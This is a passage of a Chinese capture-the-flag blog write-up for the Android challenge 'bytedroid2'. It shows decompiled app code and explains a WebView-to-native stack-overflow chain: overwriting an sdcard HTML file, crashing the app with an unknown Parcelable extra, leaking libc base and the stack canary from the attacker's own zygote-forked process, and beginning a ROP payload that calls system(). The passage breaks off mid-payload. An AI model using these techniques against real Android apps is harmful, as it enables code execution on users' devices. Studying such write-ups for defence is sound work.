class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>MainActivity.java,通过filet协议打开&#x2F;sdcard&#x2F;Documents&#x2F;Bytedroid2&#x2F;index.html,并注册了js接口Bridgeutils,有一个func函数,接收hex编码的字符串</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.JavascriptInterface;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">byte</span>[] bArr)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;Utils&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                UnZipAssetsFolder(getApplicationContext(), <span class="string">&quot;game.zip&quot;</span>, <span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;BridgeUtils&quot;</span>);</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.loadUrl(<span class="string">&quot;file:&quot;</span> + file.getPath() + <span class="string">&quot;?lang=&quot;</span> + Locale.getDefault().getLanguage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        func(unhex(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] unhex(String str) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[str.length() / <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; str.length()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i + <span class="number">2</span>;</span><br><span class="line">            bArr[i / <span class="number">2</span>] = (<span class="type">byte</span>) Integer.parseInt(str.substring(i, i2), <span class="number">16</span>);</span><br><span class="line">            i = i2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">UnZipAssetsFolder</span><span class="params">(Context context, String zipFileString, String outPathString)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">inPutZip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(context.getAssets().open(zipFileString));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> inPutZip.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (zipEntry != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">szName</span> <span class="operator">=</span> zipEntry.getName();</span><br><span class="line">                <span class="keyword">if</span> (zipEntry.isDirectory()) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">szName2</span> <span class="operator">=</span> szName.substring(<span class="number">0</span>, szName.length() - <span class="number">1</span>);</span><br><span class="line">                    <span class="type">File</span> <span class="variable">folder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName2);</span><br><span class="line">                    <span class="keyword">if</span> (!folder.exists()) &#123;</span><br><span class="line">                        folder.mkdirs();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outPathString + File.separator + szName);</span><br><span class="line">                    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                        file.getParentFile().mkdirs();</span><br><span class="line">                        file.createNewFile();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inPutZip.read(buffer);</span><br><span class="line">                        <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        out.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inPutZip.close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;BridgeUtils&quot;</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th>配置</th><th>风险</th></tr></thead><tbody><tr><td>JavaScriptEnabled</td><td>JS 可执行</td></tr><tr><td>AllowFileAccess</td><td>file:&#x2F;&#x2F; 可读</td></tr><tr><td>addJavascriptInterface(this, …)</td><td><strong>直接暴露 Activity</strong></td></tr></tbody></table><p>js可以直接调用func的native函数</p><p>加载本地 HTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(&quot;file:&quot; + file.getPath() + &quot;?lang=&quot; + Locale.getDefault().getLanguage());</span><br></pre></td></tr></table></figure><p>最终加载的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///sdcard/Documents/Bytedroid2/index.html?lang=zh</span><br></pre></td></tr></table></figure><p><strong>index.html 完全可控</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] unhex(String str) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[str.length() / <span class="number">2</span>];</span><br><span class="line">    ...</span><br><span class="line">    Integer.parseInt(str.substring(i, i2), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以<strong>精确控制传入 native 的字节流</strong></p><h3 id="func"><a href="#func" class="headerlink" title="func"></a>func</h3><p>IDA打开so可以看见如下的代码:</p><p>这里可以直接发现栈溢出了，把a3直接拷贝到a1没有经过长度校验</p><blockquote><p>Cmake参数默认，即默认的保护全开:</p><p><strong>Stack Canary（-fstack-protector-strong）</strong></p><p><strong>NX（栈不可执行）</strong></p><p><strong>PIE + ASLR</strong></p><p><strong>FORTIFY_SOURCE</strong></p><p><strong>RELRO（至少 Partial）</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126135741590.png" alt="image-20260126135741590"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>Step1</strong>:篡改SDcard下的html，从而能执行任意javascript</p><p>Vulner App是运行在安卓11上targetsdk&#x3D;30的apk，需要先阅读了解到安卓11中关于存储机制的更新。这个限制导致了即使在sever.py中授予了Attacker App权限WRITE_EXTERNAL_STORAGE，其也不能重写Vulner App在SDcard下创建的文件。</p><blockquote><p><a href="https://developer.android.com/about/versions/11/privacy/storage?hl=zh-cn">Android 11 中的存储空间更新  | Android Developers</a></p><p><strong>在 Android 11 上运行但以 Android 10（API 级别 29）为目标平台的应用仍可请求 requestLegacyExternalStorage 属性。</strong></p><ul><li><strong>可以</strong>在 <code>AndroidManifest.xml</code> 里写：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:requestLegacyExternalStorage=&quot;true&quot;</span><br></pre></td></tr></table></figure><ul><li>系统会<strong>给一个兼容期</strong></li><li><strong>暂时继续用 Android 9&#x2F;10 老的外部存储访问方式</strong></li></ul><p><strong>当应用更新为以 Android 11 为目标平台后，系统会忽略 requestLegacyExternalStorage 标记。</strong></p><p><strong>什么是分区存储模型</strong>?每个 App 在外部存储中只能“看见”属于自己的那一小块区域，默认不能随意访问或修改其他 App 的文件</p><p>存储模型（Android 9 及以前）</p><p>谁拿到权限，谁就能在 &#x2F;sdcard 里为所欲为。”</p><p>只要有WRITE_EXTERNAL_STORAGE</p><p>就可以：</p><ul><li>读 <code>/sdcard/Documents/*</code></li><li>写 <code>/sdcard/Download/*</code></li></ul><p>每个 App 都有自己的外部存储沙盒,系统划好了几块合法领地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Android/data/&lt;包名&gt;/</span><br><span class="line">/sdcard/Android/obb/&lt;包名&gt;/</span><br></pre></td></tr></table></figure><p>公共目录也被限制访问方式</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Documents</span><br><span class="line">/sdcard/Download</span><br><span class="line">/sdcard/Pictures</span><br></pre></td></tr></table></figure><p>不再是有权限就能随便 open()</p><p>要么：</p><ul><li>通过 <strong>系统 API（MediaStore &#x2F; SAF）</strong></li><li>要么用户手动授权（文件选择器）</li></ul><p>在分区存储下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WRITE_EXTERNAL_STORAGE</span><br></pre></td></tr></table></figure><p> 不再等于随意写 sdcard</p></blockquote><p>继续阅读文档，其提供了一种暂时停用分区存储的做法:<a href="https://developer.android.com/training/data-storage/use-cases#opt-out-scoped-storage">https://developer.android.com/training/data-storage/use-cases#opt-out-scoped-storage</a></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126144718761.png" alt="image-20260126144718761"></p><blockquote><p>index.html 位于 &#x2F;sdcard&#x2F;Android&#x2F;data&#x2F;{vulner App}&#x2F;cache 下难度更大</p><p>原因非常简单也非常现实：<code>/sdcard/Android/data/other.package/</code><strong>在 Android 11 上对其他 App 基本不可写</strong>哪怕 targetSdk&#x3D;28，也会被系统额外限制基本逼你走：root,adb shell或系统漏洞</p></blockquote><p><strong>Step2</strong>:让我们篡改的html内容生效，即重启VulnerApp</p><p>安卓上一个非常很普遍的现象,intent.getxxxExtra缺失trycatch,假设我们构造如下Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getPackageManager().getLaunchIntentForPackage(<span class="string">&quot;com.bytectf.bytedroid2&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">CrashParcelable</span>());</span><br><span class="line">intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>CrashParcelable.java,随便新建一个parcelable类，只要该类在目标App中找不到即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbytedroid2;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrashParcelable</span> <span class="keyword">extends</span> <span class="title class_">Intent</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>只要Vulner App在接收到Intent后，尝试intent.getxxxExtra或者intent.hasExtra，就会触发整个bundle的反序列化，当尝试对key为crash的数据进行反序列时，由于classloader找不到该类，就会抛出 android.os.BadParcelableException: ClassNotFoundException whenunmarshalling，没有catch此错误将会导致app crash。</p><blockquote><p>Android 的 Intent extras 本质上是一个 Bundle，Bundle 在跨进程&#x2F;跨组件传输时会走<strong>Parcel 序列化</strong>。</p><ul><li>在攻击 App 里 <code>putExtra(&quot;crash&quot;, new CrashParcelable())</code>系统把这个对象写进 Parcel（序列化）。</li><li>目标 App 收到 Intent 后，一旦去读 extras（比如 <code>getStringExtra</code> &#x2F; <code>getExtras</code> &#x2F; <code>hasExtra</code> 等）系统就需要把Parcel里的数据反序列化还原成对象（unmarshall）。</li></ul><p>关键点：<strong>反序列化时需要目标 App 的 ClassLoader 能加载到这个类</strong>。</p><p>如果类在目标 App 里不存在（你故意用攻击 App 自己的类），就会抛：BadParcelableException: ClassNotFoundException when unmarshalling …</p><p>如果目标 App 没 catch，主线程异常直接崩溃。</p></blockquote><p>这个技巧基本对所有App都通用，包括一些系统应用，但能做到的也仅仅是临时性crash，通常不被考虑为漏洞。回到此题，我们需要通过上述技巧来crash掉Vulner App，再重新launch，触发我们的html代码</p><p>需要让其重新 onCreate，loadUrl</p><p><strong>Step3</strong>:通过jsbridge触发native上的栈溢出，并绕过ASLR和Canary，完成无回显的ROP利用</p><p>先来观察一下安卓的栈结构，通过lldb进行调试，断点到memcpy:</p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126151935349.png" alt="image-20260126151935349" style="zoom:67%;" /><p>那么要栈溢出完成ROP，需要解决两个问题:</p><ol><li>如何leak canary</li><li>如何获取ASLR后的Nativelib地址</li></ol><p>官方wp指出：</p><blockquote><p>发现多次重启app，他的canary和ret addr总是固定的，于是有了一个大胆猜想。随后通过调试验证出一个结论，所有安卓应用的libc.so以及大部分公共so的基地址是一致的，不同应用间canary也是一致的，重启app进程也不会使他们的值发生改变，仅当重启手机才会变化。</p><p>猜想这很有可能与安卓的zygote机制有关，即应用都是由zygote这个进程孵化(fork)而来，ASLR和Canary在zygote进程启动的时候就已经确定，zygote重启(手机重启)这个值才会改变。在安卓本地利用的场景下，这个特性使得栈溢出几乎失去了ASLR和Canary的保护，因为Attacker App可以读取自身内存完成leak。</p></blockquote><p><strong>Zygote 是 Android 系统中所有 App 进程的母体进程。</strong>它在系统启动时创建，提前加载好运行环境，然后通过 <code>fork()</code> 快速复制自己来生成每一个应用进程。如果没有，假设每启动一个App都要，启动一个全新进程初始化ART&#x2F;Dalvik虚拟机加载libc、 libart、 framework建ClassLoader、线程环境。很慢</p><p>有Zygote：Android开机时:系统先启动Zygote进程，Zygote去启动ART虚拟机，加载libc&#x2F;libart&#x2F;常用系统so，预加载Javaframework类，当你点开一个App:<br>系统对Zygote调用fork()得到一个几乎现成的子进程子进程再加载App自己的代码</p><p>子进程 &#x3D; 父进程的完整内存快照（写时复制）</p><blockquote><p><strong>Zygisk 是 Magisk 引入的一种在 zygote fork 应用之前进行代码注入的机制。它允许你在所有 App 进程诞生的那一刻，把自己的 native 代码塞进去。</strong></p></blockquote><p>关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getLibcBase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">i</span> <span class="operator">=</span> IOUtils.toString(fileInputStream);</span><br><span class="line">        <span class="keyword">for</span> (String line : i.split(<span class="string">&quot;\n&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (line.contains(<span class="string">&quot;libc.so&quot;</span>)) &#123;</span><br><span class="line">                libcBase = line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> libcBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getCanary</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260126190515452.png" alt="image-20260126190515452"></p><p>canary也是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    jbyte buf[<span class="number">0x80</span>];</span><br><span class="line">    LOGE(<span class="string">&quot;%p&quot;</span>, *(<span class="type">size_t</span> *)(buf + <span class="number">0x80</span>));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *)(buf + <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>显然安卓的这一机制很不合理，在本地利用场景下，栈溢出将变得大有可为。</p></blockquote><p>接下来是常规的ROP，构造参数去调用libc中的system。调试发现memcpy后eax正好指向&amp;buf,有了栈地址可以节省很大功夫，但这里不能直接用buf地址，因为在system函数的栈会与该段重合，导致内存被破坏。我们将shell命令的地址抬高，并通过gadget来运算一下eax，关键代码:</p><blockquote><p>pwn这块好久没看了 ，其实这里的意思就是你已经跳转到system，但是重合会造成构造的字符串被破坏执行命令失败</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    libc_base = &#123; <span class="title function_">getLibcBase</span>() <span class="keyword">in</span> <span class="title class_">Java</span> &#125;</span><br><span class="line">    canary = &#123; <span class="title function_">getCanary</span>() <span class="keyword">in</span> <span class="title class_">Java</span> &#125;</span><br><span class="line">    system = <span class="number">0x89d20</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>.<span class="title function_">padEnd</span>(<span class="number">0x80</span> * <span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(canary)</span><br><span class="line">    